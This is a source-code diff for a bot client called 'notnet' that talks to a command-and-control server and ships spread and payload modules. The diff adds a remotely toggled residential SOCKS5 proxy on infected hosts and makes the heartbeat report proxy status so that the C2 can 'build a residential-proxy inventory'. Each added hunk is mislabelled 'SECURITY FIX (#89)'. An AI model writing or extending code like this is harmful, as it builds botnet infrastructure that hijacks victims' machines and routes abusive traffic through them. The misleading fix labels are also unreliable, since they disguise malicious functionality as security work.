@@ -5,6 +5,7 @@
 #include "protocol.h"
 #include "spread.h"
 #include "payload.h"
+#include "proxy.h"
 #include "util.h"
 #include <stdio.h>
 #include <stdlib.h>
@@ -2474,6 +2475,34 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     bot->dead_drop_interval = (uint32_t)v;
                     applied = 1;
                 }
+            } else if (strcmp(key, "proxy_enabled") == 0) {
+                /* SECURITY FIX (#89): strict 0/1 toggle. Takes effect
+                 * immediately: 1 starts the accept thread (token required),
+                 * 0 stops it. */
+                int v = atoi(value);
+                if (v == 0 || v == 1) {
+                    bot->proxy_enabled = (uint8_t)v;
+                    if (v == 1) {
+                        if (bot->proxy_token[0] == '\0') {
+                            log_warn("CMD: proxy_enabled=1 but no proxy_token set");
+                        } else {
+                            proxy_start(bot);
+                        }
+                    } else {
+                        proxy_stop();
+                    }
+                    applied = 1;
+                }
+            } else if (strcmp(key, "proxy_port") == 0) {
+                int v = atoi(value);
+                if (v >= 1 && v <= 65535) {
+                    bot->proxy_port = (uint16_t)v;
+                    applied = 1;
+                }
+            } else if (strcmp(key, "proxy_token") == 0) {
+                strncpy(bot->proxy_token, value, sizeof(bot->proxy_token) - 1);
+                bot->proxy_token[sizeof(bot->proxy_token) - 1] = '\0';
+                applied = 1;
             }
             
             if (applied) {
@@ -2482,6 +2511,44 @@ int protocol_process_commands(notnet_bot_t *bot) {
             } else {
                 log_warn("CMD: config_set rejected key '%s'", key);
                 protocol_send_response(bot, CMD_CONFIG_SET, "config_set: key not allowed or invalid value");
+            }
+        } else if (strncmp(cmd, CMD_PROXY, strlen(CMD_PROXY)) == 0) {
+            /* SECURITY FIX (#89): Residential SOCKS5 forward proxy.
+             * 'proxy on [port]' starts the accept thread, 'proxy off'
+             * stops it. Refused without a configured proxy_token. */
+            char *args = cmd + strlen(CMD_PROXY);
+            while (*args == ' ' || *args == '\t') args++;
+            if (strncmp(args, "on", 2) == 0) {
+                int port = 0;
+                char *rest = args + 2;
+                while (*rest == ' ' || *rest == '\t') rest++;
+                if (*rest != '\0') {
+                    int v = atoi(rest);
+                    if (v >= 1 && v <= 65535) port = v;
+                }
+                if (port && proxy_is_running() && proxy_get_port() != port) {
+                    proxy_stop();   /* rebind on the requested port */
+                }
+                if (port) bot->proxy_port = (uint16_t)port;
+                if (bot->proxy_token[0] == '\0') {
+                    protocol_send_response(bot, CMD_PROXY, "proxy on: no proxy_token configured (set proxy_token=)");
+                } else if (proxy_start(bot) == 0) {
+                    log_info("CMD: proxy on (port %d)", proxy_get_port());
+                    char rbuf[64];
+                    snprintf(rbuf, sizeof(rbuf), "proxy on: listening on %d", proxy_get_port());
+                    protocol_send_response(bot, CMD_PROXY, rbuf);
+                } else {
+                    protocol_send_response(bot, CMD_PROXY, "proxy on: failed to start (bind or thread)");
+                }
+            } else if (strncmp(args, "off", 3) == 0) {
+                if (proxy_is_running()) {
+                    proxy_stop();
+                    protocol_send_response(bot, CMD_PROXY, "proxy off: stopped");
+                } else {
+                    protocol_send_response(bot, CMD_PROXY, "proxy off: not running");
+                }
+            } else {
+                protocol_send_response(bot, CMD_PROXY, "proxy: usage proxy on|off [port]");
             }
         }
     }
@@ -2553,10 +2620,12 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     json_escape(bot->secret, safe_secret, sizeof(safe_secret));
 
     char heartbeat[1024];
+    /* SECURITY FIX (#89): report proxy status so the C2 can build a
+     * residential-proxy inventory (on/off + bound port). */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"secret\":\"%s\"}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
-        safe_secret);
+        safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port());
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
@@ -3246,6 +3315,22 @@ int load_config(notnet_bot_t *bot, const char *path) {
                 log_warn("Config: dead_drop_interval=%d out of range (30-86400), keeping %u",
                          v, bot->dead_drop_interval);
             }
+        } else if (strcmp(key, "proxy_enabled") == 0) {
+            /* SECURITY FIX (#89): residential SOCKS5 proxy toggle. The
+             * accept thread is started at boot (notnet.c) only when this is
+             * 1 AND a proxy_token is set. */
+            bot->proxy_enabled = (atoi(value) != 0);
+        } else if (strcmp(key, "proxy_port") == 0) {
+            int v = atoi(value);
+            if (v >= 1 && v <= 65535) {
+                bot->proxy_port = (uint16_t)v;
+            } else {
+                log_warn("Config: proxy_port=%d out of range (1-65535), keeping %u",
+                         v, bot->proxy_port);
+            }
+        } else if (strcmp(key, "proxy_token") == 0) {
+            strncpy(bot->proxy_token, value, sizeof(bot->proxy_token) - 1);
+            bot->proxy_token[sizeof(bot->proxy_token) - 1] = '\0';
         }
     }
     
